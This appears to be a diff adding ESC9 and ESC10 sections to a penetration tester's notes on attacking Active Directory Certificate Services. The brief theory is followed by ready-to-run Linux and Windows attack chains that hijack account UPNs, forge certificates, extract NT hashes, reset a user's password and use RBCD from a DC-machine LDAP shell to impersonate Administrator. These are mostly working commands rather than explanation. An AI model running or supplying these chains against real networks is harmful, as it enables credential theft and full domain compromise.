@@ -371,8 +371,185 @@ Bitmask, combine values:
 
 Default is `0x18` (`0x8` + `0x10`). Schannel can't read the SID extension directly, but it "converts" its mapping to Kerberos via S4USelf, then maps as above. If cert auth breaks, Microsoft's official fix is to set this back to the old `0x1f`, which re-enables the weak implicit methods (and the attack surface).
 ## ESC9
+Hinges on the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the template's `msPKI-Enrollment-Flag`. When set, the CA omits the `szOID_NTDS_CA_SECURITY_EXT` extension, which is the piece that embeds the requester's objectSID into the cert.
+
+No embedded SID means strong certificate mapping can't happen. Even with `StrongCertificateBindingEnforcement = 1` (the default), the KDC falls back to mapping by UPN alone, exactly as if the key were `0`. 
+
+If you can write to a user's UPN (need `GenericWrite`/`GenericAll` ), you set the UPN A to match your target B. You enroll as A against the vulnerable template. Because the cert carries no SID and only the UPN, the resulting cert maps to B, not A. Authenticate, get B's TGT and hash.
+
+How to tell?
+	The tell in the Certipy output is `Certificate has no object SID`.
+
+Requirements:
+1. `StrongCertificateBindingEnforcement != 2`, OR `CertificateMappingMethods` contains the UPN flag (`0x4`). Same registry keys from your mapping theory section.
+2. Template has `NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag`.
+3. Template allows Client Authentication.
+4. `GenericWrite` (or better) over account A to compromise account B.
+
+Linux POC
+```bash
+# Identify vulnerable template
+certipy find -u '<USER>' -p 'Password123!' -dc-ip <IP> -vulnerable -stdout
+	# ESC9
+
+# We need a user we can AUTHENTICATE with (user), full control over ANY user (user2), and a TARGET user we want to compromise (user3).
+# Use DACLEDIT to enumerate uer rights
+dacledit.py -action read -dc-ip <dc_ip> domain/user:Password123! -principal <user> -target <user2>
+	# Access mask : FullControl
+
+# Retrieve user2 NT Hash via Shadow Credentials
+certipy shadow auto -u '<user>@<domain>' -p 'Password123!' -account user2
+	# Make note of NT hash
+
+# Change user2 UPT to user3
+certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user3@domain
+
+# Request vulnerable certipy with user2
+certipy req -u 'user2@domain' -hashes <user2_hash> -ca <ca_name> -template <template_name>
+	# user3.pfx
+
+# Revert changes of user2 (DON'T SKIP - required to work)
+certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user2@domain
+
+# Authenticate as user3
+certipy auth -pfx user3.pfx -domain domain -dc-ip <dc_ip>
+	# Make note of NT Hash
+```
+
+Windows POC
+```powershell
+# Enumerate vulnerable template
+.\Certify.exe find
+	# Look for: mspki-enrollment-flag : NO_SECURITY_EXTENSION + Client Authentication EKU
+
+# Confirm registry conditions (only if you have access to the ADCS server)
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
+	# StrongCertificateBindingEnforcement != 2  (default 1)
+reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\
+	# OR CertificateMappingMethods contains 0x4 (UPN flag)
+
+# We need a user we can AUTHENTICATE with (user), full control over ANY user (user2), and a TARGET user (user3).
+# Find accounts we have GenericWrite/GenericAll over
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+Import-Module .\PowerView.ps1
+$user=(Get-DomainUser -Identity <user>)
+Get-DomainObjectAcl -LDAPFilter "(&(objectClass=user)(objectCategory=person))" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -contains "GenericAll" -or $_.ActiveDirectoryRights -contains "GenericWrite") -and $_.SecurityIdentifier -eq $user.objectsid}
+	# ObjectDN CN=User2 ... ActiveDirectoryRights : GenericAll
+
+# Reset user2's password (Certify can't take creds, so we need a real session as user2)
+Set-DomainUserPassword -Identity user2 -AccountPassword $((ConvertTo-SecureString 'Newpassword123!' -AsPlainText -Force)) -Verbose
+
+# Change user2 UPN to match user3
+Set-DomainObject user2 -Set @{'userPrincipalName'='user3@domain'} -Verbose
+
+# Get a session as user2 (RDP / RunasCS / runas), then confirm context
+# xfreerdp /u:user2 /p:'Newpassword123!' /d:domain /v:<IP>
+whoami
+	# domain\user2
+
+# Request cert as user2 with altname user3
+.\Certify.exe request /ca:<ca_name> /template:<template_name> /altname:user3
+	# Save cert.pem output -> user3.pem
+
+# Convert PEM to PFX
+& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in .\user3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out user3.pfx
+	# OR from linux
+	openssl pkcs12 -in user3.pem -export -out user3.pfx
+
+# (Revert user2 UPN back to clean up)
+Set-DomainObject user2 -Set @{'userPrincipalName'='user2@domain'} -Verbose
+
+# Request TGT as user3 + pull NT hash
+.\Rubeus.exe asktgt /user:user3 /certificate:user3.pfx /getcredentials /nowrap
+	# NTLM : <user3_hash>
+```
 ## ESC10
-## ESC15
+The `ESC10` abuse case is similar to the previous `ESC9` but focuses on misconfigurations in registry keys rather than template configurations.
+
+Case 1 - Kerberos - `StrongCertificateBindingEnforcement = 0x0`
+	Strong mapping is off entirely, so the KDC maps by UPN during PKINIT. You swap A's UPN to the target, enroll, revert, then auth normally via Kerberos, exactly like ESC9's auth step.
+
+Case 2 - Schannel - `CertificateMappingMethods = 0x4` 
+	The weak mapping is on the Schannel path, not Kerberos. So you can't PKINIT with the cert, you authenticate over Schannel (`-ldap-shell`). Critical constraint: the target B must have no existing UPN, otherwise you hit a constraint violation swapping A's UPN to match. That means Case 2 targets machine accounts (`dc$`) or the built-in Administrator. That naturally chains into RBCD, since you land as the DC machine account.
+
+How to tell?  
+	No tool flags ESC10 outright. You confirm by reading the registry from the DC (admin needed), or you just try the attack. Case 1: `StrongCertificateBindingEnforcement = 0x0`. Case 2: `CertificateMappingMethods = 0x4`.
+
+Requirements - Case 1:
+1. `StrongCertificateBindingEnforcement = 0` (only honored if April 2023 updates not installed).
+2. At least one template allows Client Authentication (e.g. built-in `User`).
+3. `GenericWrite` over account A to compromise account B.
+
+Requirements - Case 2:
+1. `CertificateMappingMethods = 0x4`.
+2. At least one template allows Client Authentication (e.g. built-in `User`).
+3. `GenericWrite` over A to compromise B, where **B has no UPN set** (machine accounts, built-in Administrator).
+
+Linux POC - Case 1 (Kerberos)
+```bash
+# Confirm reg key (needs DC admin — otherwise just try the attack)
+reg.py 'domain'/'Administrator':'Password123!'@<dc_ip> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'
+	# StrongCertificateBindingEnforcement REG_DWORD 0x0
+
+# Grab user2's hash without disrupting them
+certipy shadow auto -u '<user>@<domain>' -p 'Password123!' -account user2
+	# Make note of NT hash
+
+# Swap user2 UPN to the target (here: Administrator)
+certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn administrator@domain
+
+# Request cert on ANY client-auth template (built-in User)
+certipy req -u 'user2@<domain>' -hashes <user2_hash> -ca <ca_name> -template User
+	# administrator.pfx  (note: this one HAS an object SID, unlike ESC9)
+
+# Revert user2 UPN — REQUIRED before auth so administrator@domain resolves to the real admin
+certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user2@domain
+
+# Auth as Administrator via Kerberos
+certipy auth -pfx administrator.pfx -username administrator -domain domain -dc-ip <dc_ip>
+	# Make note of NT hash
+```
+
+Linux POC - Case 2 (Schannel → RBCD)
+```bash
+# Confirm reg key (needs DC admin)
+reg.py 'domain'/'Administrator':'Password123!'@<dc_ip> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'
+	# CertificateMappingMethods REG_DWORD 0x4
+
+# Grab user2's hash
+certipy shadow auto -u '<user>@<domain>' -p 'Password123!' -account user2
+	# Make note of NT hash
+
+# Swap user2 UPN to the DC machine account (target MUST have no UPN)
+# use nxc -computers to get machine account names
+certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn '<dc$_account>@<domain>'
+
+# Request cert on any client-auth template
+certipy req -u 'user2@domain' -hashes <user2_hash> -ca <ca_name> -template User
+	# dc.pfx
+
+# Revert user2 UPN
+certipy account update -u '<user>@<domain>' -p 'Password123!' -user user2 -upn user2@domain
+
+# Can't PKINIT — auth over Schannel into an LDAP shell (running as DC$)
+certipy auth -pfx <dc.pfx> -domain <domain> -dc-ip <dc_ip> -ldap-shell
+	# Authenticated as: u:DOMAIN\DC$
+
+# --- inside the LDAP shell ---
+add_computer pwned plaintext123 # creates pwned$ / plaintext123
+set_rbcd <dc$> pwned$ # pwned$ can now impersonate on dc via S4U2Proxy
+exit
+
+# Impersonate Administrator via RBCD
+getST.py -spn cifs/<DC>.<DOMAIN> -impersonate Administrator -dc-ip <dc_ip> domain/'pwned$':plaintext123
+	# Administrator.ccache
+	# If KRB_AP_ERR_BADMATCH: unset KRB5CCNAME
+
+# Use the ticket
+KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass DC.DOMAIN
+```
+
+
 ## ESC15
 Also known as "EKUwu" (research by Justin Bollinger, TrustedSec) and tracked as CVE-2024-49019. Affects unpatched CAs and lets an attacker inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. Because the injected policy can be Client Authentication or Certificate Request Agent, a template that never intended to allow auth becomes an ESC1 or ESC3 primitive.
 
